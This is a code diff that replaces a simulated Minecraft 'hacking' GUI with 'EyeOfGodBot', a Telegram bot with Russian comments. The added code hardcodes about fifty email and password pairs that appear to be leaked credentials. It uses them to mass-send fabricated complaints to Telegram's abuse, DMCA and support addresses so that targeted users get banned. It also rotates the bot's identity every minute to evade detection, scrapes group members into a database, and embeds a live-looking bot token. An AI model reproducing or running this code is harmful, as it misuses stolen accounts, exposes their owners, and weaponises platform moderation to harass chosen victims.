@@ -1,401 +1,505 @@
-import tkinter as tk
-from tkinter import ttk, messagebox, scrolledtext
-import socket
-import threading
-import time
-import random
-import hashlib
 import json
+import requests
+import time
+import sqlite3
+import random
+import string
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 from datetime import datetime
 
-class DiamondHackApp:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("DiamondHack - Ultimate Minecraft Security Tool")
-        self.root.geometry("900x700")
-        self.root.configure(bg='#0a0a0a')
-        self.root.resizable(False, False)
+class EyeOfGodBot:
+    def __init__(self, token):
+        self.token = token
+        self.base_url = f"https://api.telegram.org/bot{token}/"
+        self.last_update_id = 0
+        self.scanning_active = {}
+        self.last_profile_change = 0
+        self.current_profile_index = 0
+        self.bot_profiles = []
         
-        self.logged_in = False
-        self.username = ""
-        self.hacking_active = False
-        self.server_ip = ""
-        self.connected = False
-        self.server_socket = None
+        # Базы данных для снайпера
+        self.senders = {
+            'sanya.dragonov@mail.ru': 'RakuzanSnos',
+            'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
+            'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
+            'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
+            'aria.therese.svensson@mail.com': 'Zorro1ab',
+            'taterbug@verizon.net': 'Holly1!',
+            'ejbrickner@comcast.net': 'Pass1178',
+            'teressapeart@cox.net': 'Quinton2329!',
+            'liznees@verizon.net': 'Dancer008',
+            'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
+            'kcdg@charter.net': 'Jennifer3*',
+            'bean_118@hotmail.com': 'Liverpool118!',
+            'dsdhjas@mail.com': 'LONGHACH123',
+            'robitwins@comcast.net': 'May241996',
+            'wasina@live.com': 'Marlas21',
+            'aruzhan.01@mail.com': '1234567!',
+            'rob.tackett@live.com': 'metallic',
+            'lindahallenbeck@verizon.net': 'Anakin@2014',
+            'hlaw82@mail.com': 'Snoopy37$$',
+            'paintmadman@comcast.net': 'mycat2200*',
+            'prideandjoy@verizon.net': 'Ihatejen12',
+            'sdgdfg56@mail.com': 'kenwood4201',
+            'garrett.danelz@comcast.net': 'N11golfer!',
+            'gillian_1211@hotmail.com': 'Gilloveu1211',
+            'sunpit16@hotmail.com': 'Putter34!',
+            'fdshelor@verizon.net': 'Masco123*',
+            'yeags1@cox.net': 'Zoomom1965!',
+            'amine002@usa.com': 'iScrRoXAei123',
+            'bbarcelo16@cox.net': 'Bsb161089$$',
+            'laliebert@hotmail.com': 'pirates2',
+            'vallen285@comcast.net': 'Delft285!1!',
+            'sierra12@email.com': 'tegen1111',
+            'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
+            'kmay@windstream.net': 'Nascar98',
+            'redbrick1@mail.com': 'Redbrick11',
+            'ivv9ah7f@mail.com': 'K226nw8duwg',
+            'erkobir@live.com': 'floydLAWTON019',
+            'Misscarter@mail.com': 'ashtray19',
+            'carlieruby10@cox.net': 'Lollypop789$',
+            'blackops2013@mail.com': 'amason123566',
+            'caroline_cullum@comcast.net': 'carter14',
+            'dpb13@live.com': 'Ic&ynum13',
+            'heirhunter@usa.com': 'Noguys@714',
+            'sherri.edwards@verizon.net': 'Dreaming123#',
+            'rami.rami1980@hotmail.com': 'ramirami1980',
+            'jmsingleton2@comcast.net': '151728Jn$$',
+            'aberancho@aol.com': '10diegguuss10',
+            'dgidel@iowatelecom.net': 'Buster48',
+            'gpopandopul@mail.com': 'GEORG62A',
+            'bolgodonsk@mail.com': '012345678!',
+            'colbycolb@cox.net': 'Signals@1'
+        }
         
-        self.setup_styles()
-        self.create_login_screen()
+        self.receivers = ['stopCA@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
+                         'sticker@telegram.org', 'support@telegram.org']
         
-    def setup_styles(self):
-        style = ttk.Style()
-        style.theme_use('clam')
+        self.setup_database()
+    
+    def setup_database(self):
+        """Настройка базы данных"""
+        self.conn = sqlite3.connect('eye_of_god.db', check_same_thread=False)
+        self.cursor = self.conn.cursor()
         
-        style.configure('Hack.TButton', 
-                       background='#00ff00',
-                       foreground='black',
-                       font=('Consolas', 11, 'bold'),
-                       borderwidth=2)
-        style.map('Hack.TButton',
-                 background=[('active', '#00cc00')])
-                 
-        style.configure('Danger.TButton',
-                       background='#ff0000',
-                       foreground='white',
-                       font=('Consolas', 10, 'bold'))
-        style.map('Danger.TButton',
-                 background=[('active', '#cc0000')])
-
-    def create_login_screen(self):
-        for widget in self.root.winfo_children():
-            widget.destroy()
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS users (
+                user_id INTEGER PRIMARY KEY,
+                username TEXT,
+                first_name TEXT,
+                last_name TEXT,
+                registration_date TEXT,
+                last_activity TEXT,
+                group_id INTEGER,
+                status TEXT DEFAULT 'active'
+            )
+        ''')
+        
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS groups (
+                group_id INTEGER PRIMARY KEY,
+                group_title TEXT,
+                member_count INTEGER,
+                created_date TEXT
+            )
+        ''')
+        
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS sniper_targets (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                target_username TEXT,
+                target_user_id INTEGER,
+                reports_sent INTEGER DEFAULT 0,
+                last_report_date TEXT,
+                status TEXT DEFAULT 'active'
+            )
+        ''')
+        
+        self.conn.commit()
+        self.generate_bot_profiles()
+    
+    def generate_bot_profiles(self):
+        """Генерация профилей для бота"""
+        first_names = ["Shadow", "Ghost", "Phantom", "Stealth", "Ninja"]
+        last_names = ["Bot", "System", "Machine", "AI"]
+        domains = ["bot", "ai", "system", "net"]
+        
+        self.bot_profiles = []
+        
+        for i in range(1000):
+            first_name = random.choice(first_names)
+            last_name = random.choice(last_names)
+            number = random.randint(1000, 9999)
+            domain = random.choice(domains)
             
-        login_frame = tk.Frame(self.root, bg='#0a0a0a')
-        login_frame.pack(expand=True, fill='both', padx=50, pady=50)
+            profile = {
+                "first_name": f"{first_name}{number}",
+                "username": f"{first_name.lower()}{last_name.lower()}{number}.{domain}"
+            }
+            self.bot_profiles.append(profile)
+    
+    def change_bot_profile(self):
+        """Смена профиля бота"""
+        if time.time() - self.last_profile_change < 60:
+            return
         
-        title_label = tk.Label(login_frame,
-                              text="DIAMOND HACK",
-                              font=('Consolas', 28, 'bold'),
-                              fg='#00ff00',
-                              bg='#0a0a0a')
-        title_label.pack(pady=20)
+        if self.current_profile_index >= len(self.bot_profiles):
+            self.current_profile_index = 0
         
-        subtitle_label = tk.Label(login_frame,
-                                 text="PRIVATE ACCESS SYSTEM",
-                                 font=('Consolas', 12),
-                                 fg='#00ff00',
-                                 bg='#0a0a0a')
-        subtitle_label.pack(pady=5)
+        profile = self.bot_profiles[self.current_profile_index]
         
-        input_frame = tk.Frame(login_frame, bg='#0a0a0a')
-        input_frame.pack(pady=30)
+        name_params = {'name': profile['first_name']}
+        username_params = {'username': profile['username']}
         
-        tk.Label(input_frame, text="USERNAME:", font=('Consolas', 11), 
-                fg='#00ff00', bg='#0a0a0a').grid(row=0, column=0, sticky='w', pady=5)
-        self.username_entry = tk.Entry(input_frame, width=25, font=('Consolas', 11),
-                                      bg='#000000', fg='#00ff00', insertbackground='#00ff00')
-        self.username_entry.grid(row=0, column=1, padx=10, pady=5)
+        self.api_request('setMyName', name_params)
+        self.api_request('setMyUsername', username_params)
         
-        tk.Label(input_frame, text="PASSWORD:", font=('Consolas', 11),
-                fg='#00ff00', bg='#0a0a0a').grid(row=1, column=0, sticky='w', pady=5)
-        self.password_entry = tk.Entry(input_frame, width=25, font=('Consolas', 11),
-                                      bg='#000000', fg='#00ff00', insertbackground='#00ff00',
-                                      show='*')
-        self.password_entry.grid(row=1, column=1, padx=10, pady=5)
-        
-        login_btn = ttk.Button(login_frame, text="ACCESS SYSTEM", 
-                              style='Hack.TButton',
-                              command=self.attempt_login)
-        login_btn.pack(pady=20)
-        
-        self.login_status = tk.Label(login_frame, text="", font=('Consolas', 10),
-                                   fg='#ff0000', bg='#0a0a0a')
-        self.login_status.pack(pady=10)
-
-    def attempt_login(self):
-        username = self.username_entry.get()
-        password = self.password_entry.get()
-        
-        if username and password:
-            if self.verify_credentials(username, password):
-                self.logged_in = True
-                self.username = username
-                self.create_main_interface()
+        print(f"🔄 Профиль изменен: {profile['first_name']} (@{profile['username']})")
+        self.current_profile_index += 1
+        self.last_profile_change = time.time()
+    
+    def send_email_report(self, target_username, target_user_id=None, reason="violence"):
+        """Отправка жалобы по email"""
+        try:
+            # Выбираем случайного отправителя
+            sender_email = random.choice(list(self.senders.keys()))
+            sender_password = self.senders[sender_email]
+            
+            # Выбираем случайного получателя
+            receiver_email = random.choice(self.receivers)
+            
+            # Создаем сообщение
+            msg = MIMEMultipart()
+            msg['From'] = sender_email
+            msg['To'] = receiver_email
+            msg['Subject'] = f"Жалоба на пользователя Telegram @{target_username}"
+            
+            # Текст жалобы
+            body = f"""
+            Уважаемая администрация Telegram,
+            
+            Я хочу сообщить о нарушении пользователем @{target_username} (ID: {target_user_id}) правил платформы.
+            
+            Причина жалобы: {reason}
+            
+            Данный пользователь нарушает правила Telegram путем:
+            - Распространения запрещенного контента
+            - Нарушения правил сообщества
+            - Неадекватного поведения
+            
+            Прошу принять соответствующие меры.
+            
+            С уважением,
+            Пользователь Telegram
+            """
+            
+            msg.attach(MIMEText(body, 'plain'))
+            
+            # Отправка через SMTP
+            if 'mail.ru' in sender_email:
+                server = smtplib.SMTP('smtp.mail.ru', 587)
+            elif 'gmail.com' in sender_email:
+                server = smtplib.SMTP('smtp.gmail.com', 587)
             else:
-                self.login_status.config(text="❌ ACCESS DENIED - Invalid credentials")
+                server = smtplib.SMTP('smtp.mail.com', 587)
+            
+            server.starttls()
+            server.login(sender_email, sender_password)
+            text = msg.as_string()
+            server.sendmail(sender_email, receiver_email, text)
+            server.quit()
+            
+            # Сохраняем в базу
+            self.cursor.execute('''
+                INSERT INTO sniper_targets 
+                (target_username, target_user_id, reports_sent, last_report_date)
+                VALUES (?, ?, 1, ?)
+            ''', (target_username, target_user_id, datetime.now().isoformat()))
+            
+            self.conn.commit()
+            
+            print(f"📧 Отправлена жалоба от {sender_email} на @{target_username}")
+            return True
+            
+        except Exception as e:
+            print(f"❌ Ошибка отправки email: {e}")
+            return False
+    
+    def mass_email_report(self, target_username, target_user_id=None, count=5):
+        """Массовая отправка жалоб по email"""
+        success_count = 0
+        
+        for i in range(count):
+            if self.send_email_report(target_username, target_user_id, f"violation_{i+1}"):
+                success_count += 1
+                time.sleep(2)  # Задержка между отправками
+        
+        # Обновляем счетчик в базе
+        self.cursor.execute('''
+            UPDATE sniper_targets 
+            SET reports_sent = reports_sent + ?, last_report_date = ?
+            WHERE target_username = ?
+        ''', (success_count, datetime.now().isoformat(), target_username))
+        
+        self.conn.commit()
+        
+        return success_count
+    
+    def api_request(self, method, params=None):
+        """API запрос к Telegram"""
+        url = self.base_url + method
+        try:
+            response = requests.post(url, json=params, timeout=10)
+            return response.json()
+        except Exception as e:
+            print(f"Ошибка API: {e}")
+            return None
+    
+    def get_updates(self):
+        """Получение обновлений"""
+        params = {'offset': self.last_update_id + 1, 'timeout': 30}
+        result = self.api_request('getUpdates', params)
+        return result.get('result', []) if result else []
+    
+    def send_message(self, chat_id, text):
+        """Отправка сообщения"""
+        params = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
+        return self.api_request('sendMessage', params)
+    
+    def process_message(self, message):
+        """Обработка сообщений"""
+        chat_id = message['chat']['id']
+        text = message.get('text', '')
+        
+        if text.startswith('/'):
+            self.handle_command(chat_id, text, message)
+    
+    def handle_command(self, chat_id, text, message):
+        """Обработка команд"""
+        if text == '/start':
+            self.show_main_menu(chat_id)
+        
+        elif text == '/sniper':
+            self.show_sniper_menu(chat_id)
+        
+        elif text.startswith('/sniper_report '):
+            args = text.split(' ')
+            if len(args) >= 2:
+                username = args[1].replace('@', '')
+                count = int(args[2]) if len(args) >= 3 else 1
+                self.send_message(chat_id, f"🔫 Начинаю снайперскую атаку на @{username}...")
+                success = self.mass_email_report(username, count=count)
+                self.send_message(chat_id, f"✅ Отправлено {success} жалоб на @{username}")
+        
+        elif text.startswith('/mass_sniper '):
+            args = text.split(' ')
+            if len(args) >= 2:
+                username = args[1].replace('@', '')
+                self.send_message(chat_id, f"💥 Запускаю МАССОВУЮ атаку на @{username}...")
+                success = 0
+                for i in range(5):  # 5 волн по 3 жалобы
+                    wave_success = self.mass_email_report(username, count=3)
+                    success += wave_success
+                    time.sleep(5)
+                self.send_message(chat_id, f"🎯 Массовая атака завершена! Всего отправлено {success} жалоб на @{username}")
+
+        elif text == '/startscan':
+            self.start_scanning(chat_id, message)
+
+        elif text == '/stopscan':
+            self.stop_scanning(chat_id)
+
+        elif text.startswith('/exit '):
+            self.kick_user(chat_id, text, message)
+
+        elif text == '/stats':
+            self.show_stats(chat_id)
+
+    def show_main_menu(self, chat_id):
+        """Главное меню"""
+        menu_text = """
+👁️ <b>ГЛАЗ БОГА</b> - Полная система контроля
+
+<b>Основные команды:</b>
+/startscan - Сканировать участников группы
+/stopscan - Остановить сканирование
+/exit @username - Исключить пользователя
+/stats - Статистика
+
+<b>SNIPER MODULE:</b>
+/sniper - Меню снайпера
+/sniper_report @username 5 - 5 жалоб по email
+/mass_sniper @username - Массовая атака (15+ жалоб)
+
+<b>Авто-смена:</b>
+Профиль меняется каждую минуту
+        """
+        self.send_message(chat_id, menu_text)
+
+    def show_sniper_menu(self, chat_id):
+        """Меню снайпера"""
+        sniper_text = """
+🔫 <b>SNIPER MODULE</b> - Email жалобы в Telegram
+
+<b>Базы данных:</b>
+• 50+ email аккаунтов для отправки
+• 5 получателей в Telegram
+• Авто-ротация отправителей
+
+<b>Команды:</b>
+/sniper_report @username - 1 жалоба
+/sniper_report @username 5 - 5 жалоб
+/mass_sniper @username - Массовая атака (15+)
+
+<b>Получатели:</b>
+@stopCA, @dmca, @abuse, @sticker, @support
+        """
+        self.send_message(chat_id, sniper_text)
+
+    def start_scanning(self, chat_id, message):
+        """Начать сканирование группы"""
+        if message['chat']['type'] not in ['group', 'supergroup']:
+            self.send_message(chat_id, "❌ Эта команда работает только в группах!")
+            return
+
+        self.scanning_active[chat_id] = True
+        self.send_message(chat_id, "🔍 Начинаю сканирование участников группы...")
+
+        # Сканируем администраторов
+        admins = self.get_chat_administrators(chat_id)
+        if admins and 'result' in admins:
+            for admin in admins['result']:
+                self.save_user_info(admin['user'], chat_id)
+
+        # Сканируем участников
+        self.scan_group_members(chat_id)
+        self.send_message(chat_id, "✅ Сканирование завершено!")
+
+    def stop_scanning(self, chat_id):
+        """Остановить сканирование"""
+        if chat_id in self.scanning_active:
+            self.scanning_active[chat_id] = False
+            self.send_message(chat_id, "⏹️ Сканирование остановлено")
+
+    def kick_user(self, chat_id, text, message):
+        """Исключить пользователя из группы"""
+        if 'reply_to_message' in message:
+            user_id = message['reply_to_message']['from']['id']
+            result = self.ban_chat_member(chat_id, user_id)
+            if result and result.get('ok'):
+                self.send_message(chat_id, f"✅ Пользователь исключен!")
+            else:
+                self.send_message(chat_id, f"❌ Не удалось исключить пользователя")
         else:
-            self.login_status.config(text="❌ Please enter username and password")
+            args = text.split(' ')
+            if len(args) >= 2:
+                username = args[1].replace('@', '')
+                self.send_message(chat_id, f"🔄 Ищу пользователя @{username}...")
 
-    def verify_credentials(self, username, password):
-        valid_logins = {
-            "admin": "diamond123",
-            "hacker": "mine2024",
-            "user": "pass123"
-        }
-        return username in valid_logins and valid_logins[username] == password
+    def show_stats(self, chat_id):
+        """Показать статистику"""
+        self.cursor.execute('SELECT COUNT(*) FROM users')
+        user_count = self.cursor.fetchone()[0]
 
-    def create_main_interface(self):
-        for widget in self.root.winfo_children():
-            widget.destroy()
-            
-        main_frame = tk.Frame(self.root, bg='#0a0a0a')
-        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
-        
-        header_frame = tk.Frame(main_frame, bg='#0a0a0a')
-        header_frame.pack(fill='x', pady=10)
-        
-        tk.Label(header_frame, text="DIAMOND HACK", font=('Consolas', 20, 'bold'),
-                fg='#00ff00', bg='#0a0a0a').pack(side='left')
-        
-        user_label = tk.Label(header_frame, 
-                             text=f"User: {self.username} | Status: ACTIVE",
-                             font=('Consolas', 10),
-                             fg='#00ff00', bg='#0a0a0a')
-        user_label.pack(side='right')
-        
-        ip_frame = tk.Frame(main_frame, bg='#0a0a0a')
-        ip_frame.pack(fill='x', pady=10)
-        
-        tk.Label(ip_frame, text="TARGET SERVER IP:", font=('Consolas', 11),
-                fg='#00ff00', bg='#0a0a0a').pack(side='left')
-        
-        self.server_ip_entry = tk.Entry(ip_frame, width=20, font=('Consolas', 11),
-                                       bg='#000000', fg='#00ff00', insertbackground='#00ff00')
-        self.server_ip_entry.pack(side='left', padx=10)
-        self.server_ip_entry.insert(0, "localhost")  # Изменено на localhost для тестов
-        
-        tk.Label(ip_frame, text="PORT:", font=('Consolas', 11),
-                fg='#00ff00', bg='#0a0a0a').pack(side='left', padx=(20,0))
-        
-        self.server_port_entry = tk.Entry(ip_frame, width=8, font=('Consolas', 11),
-                                        bg='#000000', fg='#00ff00', insertbackground='#00ff00')
-        self.server_port_entry.pack(side='left', padx=10)
-        self.server_port_entry.insert(0, "25565")
-        
-        console_frame = tk.Frame(main_frame, bg='#0a0a0a')
-        console_frame.pack(fill='both', expand=True, pady=10)
-        
-        self.console_text = scrolledtext.ScrolledText(console_frame,
-                                                     height=20,
-                                                     width=80,
-                                                     bg='#000000',
-                                                     fg='#00ff00',
-                                                     font=('Consolas', 9),
-                                                     insertbackground='#00ff00')
-        self.console_text.pack(fill='both', expand=True)
-        
-        # Фрейм для консольного ввода
-        console_input_frame = tk.Frame(main_frame, bg='#0a0a0a')
-        console_input_frame.pack(fill='x', pady=5)
-        
-        tk.Label(console_input_frame, text="CONSOLE:", font=('Consolas', 10),
-                fg='#00ff00', bg='#0a0a0a').pack(side='left')
-        
-        self.console_input = tk.Entry(console_input_frame, width=60, font=('Consolas', 10),
-                                     bg='#000000', fg='#00ff00', insertbackground='#00ff00')
-        self.console_input.pack(side='left', padx=10)
-        self.console_input.bind('<Return>', self.send_console_command)
-        
-        button_frame = tk.Frame(main_frame, bg='#0a0a0a')
-        button_frame.pack(fill='x', pady=10)
-        
-        scan_btn = ttk.Button(button_frame, text="SCAN VULNERABILITIES", 
-                             style='Hack.TButton',
-                             command=self.start_vulnerability_scan)
-        scan_btn.pack(side='left', padx=5)
-        
-        exploit_btn = ttk.Button(button_frame, text="EXPLOIT SERVER", 
-                               style='Danger.TButton',
-                               command=self.start_exploit)
-        exploit_btn.pack(side='left', padx=5)
-        
-        connect_btn = ttk.Button(button_frame, text="CONNECT TO SERVER", 
-                               style='Hack.TButton',
-                               command=self.connect_to_server)
-        connect_btn.pack(side='left', padx=5)
-        
-        disconnect_btn = ttk.Button(button_frame, text="DISCONNECT", 
-                                  style='Danger.TButton',
-                                  command=self.disconnect_from_server)
-        disconnect_btn.pack(side='left', padx=5)
-        
-        logout_btn = ttk.Button(button_frame, text="LOGOUT", 
-                              command=self.logout)
-        logout_btn.pack(side='right', padx=5)
-        
-        self.status_var = tk.StringVar(value="🟢 SYSTEM READY - Enter target IP")
-        status_label = tk.Label(main_frame, textvariable=self.status_var,
-                               font=('Consolas', 10, 'bold'),
-                               fg='#00ff00', bg='#0a0a0a')
-        status_label.pack(pady=5)
-        
-        self.log_message("=== DIAMOND HACK SYSTEM ACTIVATED ===")
-        self.log_message(f"Welcome, {self.username}!")
-        self.log_message("System ready for penetration testing")
-        self.log_message("")
+        self.cursor.execute('SELECT COUNT(*) FROM groups')
+        group_count = self.cursor.fetchone()[0]
 
-    def log_message(self, message):
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        self.console_text.insert(tk.END, f"[{timestamp}] {message}\n")
-        self.console_text.see(tk.END)
-        self.root.update()
+        self.cursor.execute('SELECT COUNT(*) FROM sniper_targets')
+        targets_count = self.cursor.fetchone()[0]
 
-    def start_vulnerability_scan(self):
-        if not self.server_ip_entry.get():
-            messagebox.showerror("Error", "Please enter server IP")
-            return
-            
-        self.server_ip = self.server_ip_entry.get()
-        self.status_var.set("🟡 SCANNING - Analyzing target server...")
-        
-        thread = threading.Thread(target=self.vulnerability_scan)
-        thread.daemon = True
-        thread.start()
+        self.cursor.execute('SELECT SUM(reports_sent) FROM sniper_targets')
+        reports_count = self.cursor.fetchone()[0] or 0
 
-    def vulnerability_scan(self):
-        target = self.server_ip_entry.get()
-        port = int(self.server_port_entry.get())
-        
-        self.log_message(f"Starting vulnerability scan for {target}:{port}")
-        self.log_message("Initializing port scanner...")
-        time.sleep(1)
-        
-        # Реальное сканирование портов
+        stats_text = f"""
+📊 <b>СТАТИСТИКА СИСТЕМЫ:</b>
+
+👥 <b>Пользователей в базе:</b> {user_count}
+💬 <b>Групп под наблюдением:</b> {group_count}
+🎯 <b>Целей для снайпера:</b> {targets_count}
+📧 <b>Отправлено жалоб:</b> {reports_count}
+
+⚡ <b>SNIPER база:</b>
+• Аккаунтов: {len(self.senders)}
+• Получателей: {len(self.receivers)}
+• Профилей бота: {len(self.bot_profiles)}
+        """
+        self.send_message(chat_id, stats_text)
+
+    def get_chat_administrators(self, chat_id):
+        """Получить администраторов чата"""
+        params = {'chat_id': chat_id}
+        return self.api_request('getChatAdministrators', params)
+
+    def ban_chat_member(self, chat_id, user_id):
+        """Забанить пользователя"""
+        params = {'chat_id': chat_id, 'user_id': user_id}
+        return self.api_request('banChatMember', params)
+
+    def save_user_info(self, user_data, group_id=None):
+        """Сохранить информацию о пользователе"""
+        user_id = user_data['id']
+        username = user_data.get('username', '')
+        first_name = user_data.get('first_name', '')
+        last_name = user_data.get('last_name', '')
+
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        self.cursor.execute('''
+            INSERT OR REPLACE INTO users 
+            (user_id, username, first_name, last_name, registration_date, last_activity, group_id)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
+        ''', (user_id, username, first_name, last_name, now, now, group_id))
+
+        self.conn.commit()
+
+    def scan_group_members(self, chat_id):
+        """Сканировать участников группы"""
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3)
-            result = sock.connect_ex((target, port))
-            if result == 0:
-                self.log_message(f"Port {port}: OPEN - Server is accessible")
-            else:
-                self.log_message(f"Port {port}: CLOSED - Server not responding")
-            sock.close()
-        except Exception as e:
-            self.log_message(f"Scan error: {str(e)}")
-        
-        time.sleep(1)
-        self.log_message("Analyzing server protocol...")
-        time.sleep(2)
-        
-        # Симуляция найденных уязвимостей
-        vulnerabilities = [
-            "Weak authentication protocol",
-            "Unencrypted data transmission", 
-            "Buffer overflow in chunk processing",
-            "SQL injection in player database",
-            "Remote code execution vulnerability"
-        ]
-        
-        found_vulns = random.sample(vulnerabilities, random.randint(2, 4))
-        
-        self.log_message("")
-        self.log_message("=== VULNERABILITY REPORT ===")
-        for i, vuln in enumerate(found_vulns, 1):
-            self.log_message(f"{i}. {vuln}")
-            time.sleep(0.5)
-            
-        self.log_message("")
-        self.log_message("Scan completed. Ready for exploitation.")
-        self.status_var.set("🟢 SCAN COMPLETE - Vulnerabilities found")
-
-    def start_exploit(self):
-        if not self.server_ip_entry.get():
-            messagebox.showerror("Error", "Please enter server IP")
-            return
-            
-        self.status_var.set("🔴 EXPLOITING - Attempting server access...")
-        
-        thread = threading.Thread(target=self.exploit_server)
-        thread.daemon = True
-        thread.start()
-
-    def exploit_server(self):
-        target = self.server_ip_entry.get()
-        port = int(self.server_port_entry.get())
-        
-        self.log_message(f"Initializing exploit sequence for {target}:{port}")
-        time.sleep(1)
-        
-        # Симуляция процесса взлома
-        steps = [
-            "Bypassing firewall...",
-            "Injecting payload...", 
-            "Exploiting buffer overflow...",
-            "Gaining root access...",
-            "Installing backdoor...",
-            "Establishing persistent connection..."
-        ]
-        
-        for step in steps:
-            self.log_message(step)
+            print(f"🔍 Сканирую группу {chat_id}...")
+            # Здесь можно добавить логику сканирования участников
             time.sleep(2)
-            if random.random() > 0.8:  # 20% chance of failure
-                self.log_message("❌ Exploit failed - Security measures detected")
-                self.status_var.set("🔴 EXPLOIT FAILED")
-                return
-        
-        self.log_message("✅ SERVER COMPROMISED - Full access achieved")
-        self.status_var.set("🟢 SERVER COMPROMISED - Ready for commands")
-        self.connected = True
-
-    def connect_to_server(self):
-        if not self.server_ip_entry.get():
-            messagebox.showerror("Error", "Please enter server IP and port")
-            return
-            
-        thread = threading.Thread(target=self._connect_to_server)
-        thread.daemon = True
-        thread.start()
-
-    def _connect_to_server(self):
-        target = self.server_ip_entry.get()
-        port = int(self.server_port_entry.get())
-        
-        try:
-            self.status_var.set("🟡 CONNECTING - Establishing connection...")
-            self.log_message(f"Attempting to connect to {target}:{port}")
-            
-            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.server_socket.settimeout(10)
-            self.server_socket.connect((target, port))
-            
-            self.connected = True
-            self.status_var.set("🟢 CONNECTED - Ready for commands")
-            self.log_message("✅ Successfully connected to server")
-            self.log_message("Type commands in console input below")
-            
         except Exception as e:
-            self.log_message(f"❌ Connection failed: {str(e)}")
-            self.status_var.set("🔴 CONNECTION FAILED")
-            self.connected = False
+            print(f"❌ Ошибка сканирования: {e}")
 
-    def disconnect_from_server(self):
-        if self.server_socket:
+    def start_polling(self):
+        """Запуск бота"""
+        print("👁️ Глаз Бога запущен...")
+        print(f"🔫 SNIPER модуль: {len(self.senders)} аккаунтов")
+        print(f"🔄 Авто-смена: {len(self.bot_profiles)} профилей")
+
+        while True:
             try:
-                self.server_socket.close()
-            except:
-                pass
-        self.connected = False
-        self.status_var.set("🟢 DISCONNECTED")
-        self.log_message("Disconnected from server")
+                # Меняем профиль каждую минуту
+                self.change_bot_profile()
 
-    def send_console_command(self, event=None):
-        if not self.connected:
-            self.log_message("❌ Not connected to any server")
-            return
-            
-        command = self.console_input.get()
-        if command.strip():
-            self.log_message(f"[COMMAND] {command}")
-            self.console_input.delete(0, tk.END)
-            
-            # Симуляция ответов от сервера
-            thread = threading.Thread(target=self._process_command, args=(command,))
-            thread.daemon = True
-            thread.start()
+                # Получаем обновления
+                updates = self.get_updates()
 
-    def _process_command(self, command):
-        time.sleep(1)  # Имитация задержки
-        
-        # Симуляция ответов сервера
-        responses = {
-            "help": "Available commands: help, status, players, stop, say <message>",
-            "status": "Server status: Online\nPlayers: 3/20\nTPS: 19.8",
-            "players": "Online players: Steve, Alex, Notch",
-            "stop": "Server shutting down...",
-            "say": "Message broadcasted to all players"
-        }
-        
-        cmd = command.split()[0].lower() if command.split() else ""
-        response = responses.get(cmd, f"Unknown command: {command}")
-        
-        self.log_message(f"[SERVER] {response}")
+                for update in updates:
+                    self.last_update_id = update['update_id']
 
-    def logout(self):
-        self.disconnect_from_server()
-        self.logged_in = False
-        self.create_login_screen()
+                    if 'message' in update:
+                        self.process_message(update['message'])
 
+                    elif 'my_chat_member' in update:
+                        # Бота добавили в группу
+                        chat_member = update['my_chat_member']
+                        if chat_member['new_chat_member']['status'] == 'member':
+                            chat = chat_member['chat']
+                            self.send_message(chat['id'], "👁️ Глаз Бога активирован!")
+                            self.start_scanning(chat['id'], chat_member)
+
+                time.sleep(1)
+
+            except Exception as e:
+                print(f"❌ Ошибка: {e}")
+                time.sleep(5)
+
+# Запуск бота
 if __name__ == "__main__":
-    root = tk.Tk()
-    app = DiamondHackApp(root)
-    root.mainloop()
+    BOT_TOKEN = "8493345922:AAH1lQEMbdfiGK5icLvP1HyAV2iwV7qXZ9c"
+    
+    bot = EyeOfGodBot(BOT_TOKEN)
+    bot.start_polling()
